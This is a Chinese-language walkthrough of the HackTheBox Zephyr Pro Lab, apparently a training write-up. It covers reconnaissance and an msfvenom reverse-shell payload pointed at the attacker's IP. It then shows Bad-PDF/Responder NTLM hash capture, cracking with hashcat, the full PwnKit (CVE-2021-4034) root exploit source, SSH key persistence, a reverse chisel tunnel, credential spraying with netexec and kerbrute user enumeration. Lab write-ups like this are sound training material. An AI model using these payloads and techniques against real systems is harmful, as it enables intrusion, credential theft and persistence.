---
title: HTB-Zephyr
description: 'Pro Labs-Zephyr'
pubDate: 2026-03-22
image: /Pro-Labs/zephyr.png
categories:
  - Documentation
  - Hackthebox Prolabs
tags:
  - Hackthebox
  - Pro-Labs
  - Windows Machine
---

![](/image/hackthebox-prolabs/Zephyr-1.png)

# Introduction
> #### Zephyr!  和风！
> Zephyr is an immersive Windows Active Directory environment, designed to be attacked as a means of learning and honing your engagement skills. Beating the lab will require a number of skills, including:  
Zephyr 是一个沉浸式的 Windows Active Directory 环境，旨在通过挑战来学习和磨练您的交互技能。成功通过该实验需要掌握多项技能，包括：
>
> + OSINT & phishing  开源情报与网络钓鱼
> + 开源情报与网络钓鱼
> + Local privilege escalatio 本地权限提升
> + Persistence techniques  持久化技术
> + Active Directory enumeration & exploitation  
Active Directory 枚举与利用
> + A variety of lateral movement techniques  
多种横向移动技巧
> + Exploit development  利用开发
> + Creative thinking  创造性思维
> + Patience & perseverance!  耐心和毅力！
>
> The goal of the lab is to reach Domain Admin and collect all the flags.  
该实验的目标是联系域管理员并收集所有标志。
>

# StartPoint-10.10.110.35
## nmap
### 快速扫描
```plain
nmap 10.10.110.0/24 -Pn -n -F -T5 

Nmap scan report for 10.10.110.35
Host is up (0.40s latency).
Not shown: 97 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  closed http
443/tcp open   https
```

### 服务分析
```plain
┌──(kali㉿kali)-[~/Desktop/htb/zephyr]
└─$ nmap -sCV -Pn -n -p 22,80,443 10.10.110.35 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-20 15:49 +0800
Stats: 0:00:30 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.77% done; ETC: 15:49 (0:00:00 remaining)
Nmap scan report for 10.10.110.35
Host is up (0.26s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:ca:e7:7e:99:03:a9:78:e8:86:2e:e8:cc:2b:9f:08 (RSA)
|   256 b1:7f:c0:06:9b:e7:08:b4:6a:ab:bd:c2:96:04:23:49 (ECDSA)
|_  256 0d:3b:89:bc:d5:a4:35:e0:dd:c4:22:14:7a:48:ad:7c (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://painters.htb/home
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=painters.htb/countryName=GB
| Subject Alternative Name: DNS:mail.painters.htb, IP Address:192.168.110.51
| Not valid before: 2022-04-04T10:00:52
|_Not valid after:  2032-04-01T10:00:52
| tls-nextprotoneg: 
|   h2
|_  http/1.1
|_http-title: Did not follow redirect to https://painters.htb/home
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.41 seconds
```

### /etc/hosts
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# echo "10.10.110.35 painters.htb" >> /etc/hosts
```

## painters.htb
> [https://painters.htb/home](https://painters.htb/home)
>

### 信息收集
```plain
+44 012 345 6789
info@painters.htb
Thomas Bishop
James Ray
Toby Harlington
23 Prince Street, Bournemouth, United Kingdom
Ralph Davies
```

### dirsearch
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# dirsearch -u https://painters.htb/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/htb/zephyr/reports/https_painters.htb/__26-03-20_15-55-32.txt

Target: https://painters.htb/

[15:55:32] Starting: 
[15:56:10] 200 -    3KB - /administration                                   
[15:56:15] 405 -    0B  - /applications                                     
[15:56:27] 200 -   15KB - /contact                                          
[15:56:28] 403 -  564B  - /controllers/                                     
[15:56:41] 200 -   23KB - /home                                             
[15:56:57] 405 -    0B  - /newsletter                                       
[15:57:18] 301 -  178B  - /static  ->  https://painters.htb/static/         
[15:57:22] 200 -   13KB - /testimonials                                     
[15:57:28] 301 -  178B  - /views  ->  https://painters.htb/views/ 
```

### administration
> [https://painters.htb/administration](https://painters.htb/administration)
>

给了一个登录框

![](/image/hackthebox-prolabs/Zephyr-2.png)

### contact
> [https://painters.htb/contact](https://painters.htb/contact)
>

![](/image/hackthebox-prolabs/Zephyr-3.png)

可以发送文字，尝试进行钓鱼

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.8 LPORT=443 -f exe > zephyr64.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
```

并没有动静(失败)

### listing
> [https://painters.htb/vacancies](https://painters.htb/vacancies)
>
> [https://painters.htb/listing?id=1](https://painters.htb/listing?id=1)
>

#### pdf上传点
访问[/vacancies](https://painters.htb/vacancies) 点击OurCurrent Vacancies中三个界面之一即可进入/listing

![](/image/hackthebox-prolabs/Zephyr-4.png)

进入/listing我们发现可以上传pdf文件

![](/image/hackthebox-prolabs/Zephyr-5.png)

#### badpdf(失败)
[GitHub - deepzec/Bad-Pdf: Steal Net-NTLM Hash using Bad-PDF](https://github.com/deepzec/Bad-Pdf/tree/master)

##### 生成监听
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# python2 /home/kali/Desktop/tools/Bad-Pdf/badpdf.py

      
        ______                 __       _______  ______   ________  
        |_   _ \               |  ]     |_   __ \|_   _ `.|_   __  | 
          | |_) |  ,--.    .--.| | ______ | |__) | | | `. \ | |_ \_| 
          |  __'. `'_\ : / /'`' ||______||  ___/  | |  | | |  _|    
         _| |__) |// | |,| \__/  |       _| |_    _| |_.' /_| |_     
        |_______/ '-;__/ '.__.;__]     |_____|  |______.'|_____|

        By DeepZec 

        =============================================================
        
Responder not found..
Please enter responder path (Default /usr/bin/responder): 
/usr/sbin/responder
Please enter Bad-PDF host IP: 
10.10.16.8
Please enter output file name: 
work.pdf
Please enter the interface name to listen(Default eth0): 
tun0
How you want to send NTLM hash to Bad-IP?
[1] Over SMB:

[2] Over HTTP

 Option > 1
[*] Starting Process.. [*]
Bad PDF work.pdf created
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [ON]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.8]
    Responder IPv6             [fe80::7d13:b039:d33a:78b]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-6S2WYTD46PC]
    Responder Domain Name      [KZHU.LOCAL]
    Responder DCE-RPC Port     [45120]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...                                                                             
```





##### 上传pdf
![](/image/hackthebox-prolabs/Zephyr-6.png)

不幸的是我明明上传了pdf却迟迟没有收到任何信息

#### msfconsole
##### badpdf
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# msfconsole                                                                                      

msf > use auxiliary/fileformat/badpdf 
msf auxiliary(fileformat/badpdf) > set filename zephyr.pdf
filename => zephyr.pdf
msf auxiliary(fileformat/badpdf) > set lhost 10.10.16.8
lhost => 10.10.16.8
msf auxiliary(fileformat/badpdf) > run
[+] zephyr.pdf stored at /root/.msf4/local/zephyr.pdf
[*] Auxiliary module execution completed
```

##### zephyr.pdf
```plain
cp /root/.msf4/local/zephyr.pdf .
```

##### responder
```plain
sudo responder -I tun0 -wF
```

| 参数 | 作用 |
| --- | --- |
| -I tun0 | 监听 HTB VPN |
| -w | 开 WPAD |
| -F | 强制认证 |


---

##### upload
![](/image/hackthebox-prolabs/Zephyr-7.png)

##### NTLMv2
```plain
[SMB] NTLMv2-SSP Client   : 10.10.110.35
[SMB] NTLMv2-SSP Username : PAINTERS\riley
[SMB] NTLMv2-SSP Hash     : riley::PAINTERS:23eb42f3e9285495:0B29605727BEA83B047CBE02B10E020B:010100000000000000F82EA59CB8DC01762217EABD8F15190000000002000800540045004A00360001001E00570049004E002D0043003900360055005A0035004200390036005300560004003400570049004E002D0043003900360055005A003500420039003600530056002E00540045004A0036002E004C004F00430041004C0003001400540045004A0036002E004C004F00430041004C0005001400540045004A0036002E004C004F00430041004C000700080000F82EA59CB8DC01060004000200000008003000300000000000000000000000002000003903F8EB684DF54FC64B9FB34262DF074231847899D1297F141DA853142750750A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0038000000000000000000
```

# PAINTERS\riley-192.168.110.51
## responder
```plain
[SMB] NTLMv2-SSP Client   : 10.10.110.35
[SMB] NTLMv2-SSP Username : PAINTERS\riley
[SMB] NTLMv2-SSP Hash     : riley::PAINTERS:23eb42f3e9285495:0B29605727BEA83B047CBE02B10E020B:010100000000000000F82EA59CB8DC01762217EABD8F15190000000002000800540045004A00360001001E00570049004E002D0043003900360055005A0035004200390036005300560004003400570049004E002D0043003900360055005A003500420039003600530056002E00540045004A0036002E004C004F00430041004C0003001400540045004A0036002E004C004F00430041004C0005001400540045004A0036002E004C004F00430041004C000700080000F82EA59CB8DC01060004000200000008003000300000000000000000000000002000003903F8EB684DF54FC64B9FB34262DF074231847899D1297F141DA853142750750A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0038000000000000000000
```

这是一个：

✅ **NTLMv2 hash（SMB 捕获成功）**

## hashcat
### crack
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# cat hash      
riley::PAINTERS:23eb42f3e9285495:0B29605727BEA83B047CBE02B10E020B:010100000000000000F82EA59CB8DC01762217EABD8F15190000000002000800540045004A00360001001E00570049004E002D0043003900360055005A0035004200390036005300560004003400570049004E002D0043003900360055005A003500420039003600530056002E00540045004A0036002E004C004F00430041004C0003001400540045004A0036002E004C004F00430041004C0005001400540045004A0036002E004C004F00430041004C000700080000F82EA59CB8DC01060004000200000008003000300000000000000000000000002000003903F8EB684DF54FC64B9FB34262DF074231847899D1297F141DA853142750750A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0038000000000000000000

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

RILEY::PAINTERS:23eb42f3e9285495:0b29605727bea83b047cbe02b10e020b:010100000000000000f82ea59cb8dc01762217eabd8f15190000000002000800540045004a00360001001e00570049004e002d0043003900360055005a0035004200390036005300560004003400570049004e002d0043003900360055005a003500420039003600530056002e00540045004a0036002e004c004f00430041004c0003001400540045004a0036002e004c004f00430041004c0005001400540045004a0036002e004c004f00430041004c000700080000f82ea59cb8dc01060004000200000008003000300000000000000000000000002000003903f8eb684df54fc64b9fb34262df074231847899d1297f141da853142750750a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0038000000000000000000:P@ssw0rd
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: RILEY::PAINTERS:23eb42f3e9285495:0b29605727bea83b04...000000
Time.Started.....: Fri Mar 20 19:13:03 2026 (0 secs)
Time.Estimated...: Fri Mar 20 19:13:03 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1061.3 kH/s (1.80ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: newzealand -> whitetiger
Hardware.Mon.#01.: Util: 17%

Started: Fri Mar 20 19:13:02 2026
Stopped: Fri Mar 20 19:13:05 2026
```

### secret
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# hashcat --show -m 5600 hash
RILEY::PAINTERS:23eb42f3e9285495:0b29605727bea83b047cbe02b10e020b:010100000000000000f82ea59cb8dc01762217eabd8f15190000000002000800540045004a00360001001e00570049004e002d0043003900360055005a0035004200390036005300560004003400570049004e002d0043003900360055005a003500420039003600530056002e00540045004a0036002e004c004f00430041004c0003001400540045004a0036002e004c004f00430041004c0005001400540045004a0036002e004c004f00430041004c000700080000f82ea59cb8dc01060004000200000008003000300000000000000000000000002000003903f8eb684df54fc64b9fb34262df074231847899d1297f141da853142750750a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0038000000000000000000:P@ssw0rd
```

成功得到凭据RILEY/P@ssw0rd

## ssh连接
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# ssh riley@10.10.110.35

riley@10.10.110.35's password: P@ssw0rd
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

Last login: Fri Mar 20 11:06:52 2026 from 10.10.16.12
riley@mail:~$ 
```

## Getflag
```plain
riley@mail:~$ cat flag.txt
ZEPHYR{HuM4n_3rr0r_1s_0uR_D0wnf4ll}
```

## passwd
```plain
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
matt:x:1000:1000:Matt Fisher:/home/matt:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:114:119::/var/spool/postfix:/usr/sbin/nologin
dovecot:x:115:121:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:116:122:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
daniel:x:1001:1001:Daniel Morris,,,:/home/daniel:/bin/bash
blake:x:1002:1002:Blake Morris,,,:/home/blake:/bin/bash
riley:x:1003:1003:Riley Smart,,,:/home/riley:/bin/bash
fwupd-refresh:x:117:124:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
```

## SUID
```plain
riley@mail:/$ find / -perm -4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/at
/usr/bin/fusermount
/usr/bin/su
/usr/bin/chfn
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

## Config
```plain
riley@mail:/opt$ cat config
[req]
default_bits = 2048
prompt = no
default_md = sha256
req_extensions = req_ext
distinguished_name = dn
[ dn ]
C=GB    
L=United Kingdom         
CN = painters.htb   
[ req_ext ]
subjectAltName = @alt_names
[ alt_names ]
DNS.1 = mail.painters.htb
IP.1 = 192.168.110.51
```

## pkexec提权(失败)
### version
```plain
riley@mail:/$ pkexec --version
pkexec version 0.105
```

> 这个版本很明显有漏洞的，唉这么无聊的洞
>

### python
发现环境中存在python3环境，那么直接使用py版本的exp即可

```plain
riley@mail:/$ python3
Python 3.8.10 (default, Mar 18 2025, 20:04:55) 
[GCC 9.4.0] on linux
```

```plain
#!/usr/bin/env python3

#  CVE-2021-4034
#  Ravindu Wickramasinghe (@rvizx9)

import os
from ctypes import *
from ctypes.util import find_library

so='''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}
void gconv_init() {
    setuid(0);setgid(0);seteuid(0);setegid(0);
    system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");
    exit(0);
}
'''

def main():
    os.system("mkdir -p 'GCONV_PATH=.' pwnkit ; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'")
    os.system("echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules")
    f=open("pwnkit/pwnkit.c","w") ; f.write(so) ;f.close()
    os.system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC")
    envi=[b"pwnkit", b"PATH=GCONV_PATH=.",b"CHARSET=PWNKIT",b"SHELL=pwnkit",None]
    env=(c_char_p * len(envi))() ;env[:]=envi
    libc = CDLL(find_library('c'))
    libc.execve(b'/usr/bin/pkexec',c_char_p(None) ,env)

main()
```

### exploit
#### python-pkexec(失败)
```plain
riley@mail:/tmp$ python3 pkexec.py 
sh: 1: gcc: not found
GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS...]

See the pkexec manual page for more details.
```

缺少Gcc环境

#### ly4k/PwnKit(失败)
```plain
wget https://github.com/ly4k/PwnKit/raw/main/PwnKit
chmod +x PwnKit
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# scp PwnKit riley@10.10.110.35:/tmp/

riley@10.10.110.35's password: P@ssw0rd
PwnKit                                                                100%   18KB  20.4KB/s   00:00 
```

```plain
cd /tmp
chmod +x PwnKit
./PwnKit
```

毫无反应，嗯，失败了

## ifconfig
```plain
riley@mail:/tmp$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.110.51  netmask 255.255.255.0  broadcast 192.168.110.255
        inet6 fe80::250:56ff:fe94:e026  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:e0:26  txqueuelen 1000  (Ethernet)
        RX packets 226130  bytes 197850045 (197.8 MB)
        RX errors 0  dropped 55  overruns 0  frame 0
        TX packets 472077  bytes 207992250 (207.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 40446  bytes 3418024 (3.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 40446  bytes 3418024 (3.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

## IP探测
```plain
riley@mail:/tmp$ for i in {1..255}; do (ping -c 1 192.168.110.$i | grep "bytes from" &);done
64 bytes from 192.168.110.1: icmp_seq=1 ttl=64 time=0.336 ms
64 bytes from 192.168.110.51: icmp_seq=1 ttl=64 time=0.014 ms
64 bytes from 192.168.110.52: icmp_seq=1 ttl=128 time=0.460 ms
64 bytes from 192.168.110.53: icmp_seq=1 ttl=128 time=0.387 ms
64 bytes from 192.168.110.54: icmp_seq=1 ttl=128 time=0.576 ms
64 bytes from 192.168.110.55: icmp_seq=1 ttl=128 time=0.378 ms
```

## 权限维持
```plain
cat ~/.ssh/id_rsa.pub | ssh riley@10.10.110.35 "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
riley@10.10.110.35's password:P@ssw0rd
```

## 隧道搭建
```plain
scp /home/kali/Desktop/tools/chisel/chisel riley@10.10.110.35:/tmp/chisel
riley@10.10.110.35's password:P@ssw0rd
```

```plain
chisel server -p 443 --reverse
```

```plain
cd /tmp
chmod 777 chisel
./chisel client 10.10.16.8:443 R:socks
```

## netexec-riley
### netexec-smb
发现DC的IP

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q netexec smb 192.168.110.1/24 -u "riley" -p 'P@ssw0rd'
SMB         192.168.110.53  445    PNT-SVRBPA       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRBPA) (domain:painters.htb) (signing:False) (SMBv1:None)
SMB         192.168.110.55  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:painters.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.110.52  445    PNT-SVRSVC       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRSVC) (domain:painters.htb) (signing:False) (SMBv1:None)
SMB         192.168.110.53  445    PNT-SVRBPA       [+] painters.htb\riley:P@ssw0rd 
SMB         192.168.110.55  445    DC               [+] painters.htb\riley:P@ssw0rd 
SMB         192.168.110.52  445    PNT-SVRSVC       [+] painters.htb\riley:P@ssw0rd 
```

### netexec-winrm
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q netexec winrm 192.168.110.1/24 -u "riley" -p 'P@ssw0rd'
WINRM       192.168.110.53  5985   PNT-SVRBPA       [*] Windows Server 2022 Build 20348 (name:PNT-SVRBPA) (domain:painters.htb)
WINRM       192.168.110.55  5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:painters.htb)
WINRM       192.168.110.56  5985   WORKSTATION-1    [*] Windows 10 / Server 2019 Build 19041 (name:WORKSTATION-1) (domain:painters.htb)
WINRM       192.168.110.52  5985   PNT-SVRSVC       [*] Windows Server 2022 Build 20348 (name:PNT-SVRSVC) (domain:painters.htb)
WINRM       192.168.110.54  5985   PNT-SVRPSB       [*] Windows Server 2022 Build 20348 (name:PNT-SVRPSB) (domain:painters.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.110.53  5985   PNT-SVRBPA       [-] painters.htb\riley:P@ssw0rd
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.110.55  5985   DC               [-] painters.htb\riley:P@ssw0rd
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.110.56  5985   WORKSTATION-1    [+] painters.htb\riley:P@ssw0rd (Pwn3d!)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.110.52  5985   PNT-SVRSVC       [-] painters.htb\riley:P@ssw0rd
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.110.54  5985   PNT-SVRPSB       [-] painters.htb\riley:P@ssw0rd
```

## evil-winrm
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q evil-winrm -i 192.168.110.56 -u 'riley' -p 'P@ssw0rd'    
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                           
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\riley\Documents>whoami
workstation-1\riley
```

## 域用户枚举
### 用户名提取
```plain
riley@mail:/$ awk -F: '$3>=1000 {print $1}' /etc/passwd
nobody
matt
daniel
blake
riley

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# cat usersname 
matt
daniel
blake
riley    
```

### upload kerbrute
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/tools/kerbrute]
└─# scp /home/kali/Desktop/tools/kerbrute/kerbrute riley@10.10.110.35:/tmp/kerbrute 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
kerbrute                                                              100% 8092KB 714.3KB/s   00:11 
```

> **为什么不直接在kali走代理进行枚举：**
>
> 👉 **kerbrute + proxychains 基本是“半失效”的**
>
> ** **❗** Kerberos（88端口）很多情况下 不走代理 / 不兼容 proxychains**
>

### kerbrute  userenum
得到四个有效域用户

```plain
riley@mail:/$ cd /tmp
riley@mail:/tmp$ chmod 777 kerbrute 
riley@mail:/tmp$ ./kerbrute --dc 192.168.110.55 -d PAINTERS userenum username

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/20/26 - Ronnie Flathers @ropnop

2026/03/20 12:48:39 >  Using KDC(s):
2026/03/20 12:48:39 >   192.168.110.55:88

2026/03/20 12:48:39 >  [+] VALID USERNAME:       matt@PAINTERS
2026/03/20 12:48:39 >  [+] VALID USERNAME:       daniel@PAINTERS
2026/03/20 12:48:39 >  [+] VALID USERNAME:       riley@PAINTERS
2026/03/20 12:48:39 >  [+] VALID USERNAME:       blake@PAINTERS
